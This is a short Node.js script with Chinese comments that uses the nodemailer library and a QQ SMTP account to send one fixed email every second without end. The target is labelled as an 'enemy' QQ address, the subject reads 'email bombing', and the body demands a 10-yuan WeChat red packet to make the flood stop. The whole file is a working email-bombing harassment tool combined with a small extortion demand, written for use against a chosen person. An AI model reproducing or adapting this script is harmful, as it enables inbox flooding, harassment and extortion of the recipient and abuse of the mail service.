"use strict";
//引入mailer模块
const nodemailer = require("nodemailer");

// 创建发送邮件的对象
let transporter = nodemailer.createTransport({
    host: "smtp.qq.com",//发送方邮箱 qq 通过lib/well-know/service.json
    port: 465, //端口号
    secure: true, // true for 465, false for other ports
    auth: {
        user: 'xxx@qq.com', // 发送方的邮箱地址
        pass: 'smtp码' //  smtp 验证码
    }
});
// 邮件信息
let mailobj = {
    from: '"Fred Foo 👻" <目的地邮箱>', // sender address
    to: "仇人qq", // list of receivers
    subject: "邮箱轰炸", // Subject line
    text: "你已被轰炸了，请微信红包发我10块钱取消", // plain text body
    //html: "<b>Hello world?</b>" // html body
}
//发送邮件



setInterval(() => {
    transporter.sendMail(mailobj);
}, 1000)//每一秒发送一封邮件
  // 封装一个自定义模块，向固定的邮箱发送固定的信息




